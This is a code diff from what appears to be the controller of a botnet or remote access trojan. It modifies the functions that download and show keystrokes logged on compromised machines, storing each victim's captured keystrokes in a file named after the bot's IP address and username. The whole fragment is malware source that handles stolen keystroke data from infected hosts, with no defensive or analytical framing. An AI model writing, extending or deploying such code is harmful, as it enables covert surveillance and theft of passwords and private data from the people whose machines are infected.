@@ -280,11 +280,13 @@ def keylogdownloader():
     """Download keystrokes logged by keylogger.\n"""
     sender('SHkeylogdownload')
     keylogged_data = receiver()
+    local_filename = 'keylogged-{}-{}.txt'.format(connected_sockets[active_bot]['ip'],
+                                                      connected_sockets[active_bot]['username'])
     if keylogged_data == 'reachedexcept':
         receiver(printer=True)
     else:
         try:
-            keylogged_descriptor = open('keylogged.txt', 'a')
+            keylogged_descriptor = open(local_filename, 'a')
             keylogged_descriptor.write(keylogged_data)
             keylogged_descriptor.close()
             logging(data_to_log='Download completed!\n Use <SHkeylog show> to see keylogged data\n', printer=True)
@@ -294,8 +296,10 @@ def keylogdownloader():
 
 def keylogshower():
     """Show downloaded keystrokes in a tk window.\n"""
+    local_filename = 'keylogged-{}-{}.txt'.format(connected_sockets[active_bot]['ip'],
+                                                  connected_sockets[active_bot]['username'])
     try:
-        keylogged_descriptor = open('keylogged.txt', 'r')
+        keylogged_descriptor = open(local_filename, 'r')
         print(keylogged_descriptor.read())
         keylogged_descriptor.close()
     except IOError as exception_keylogshower:
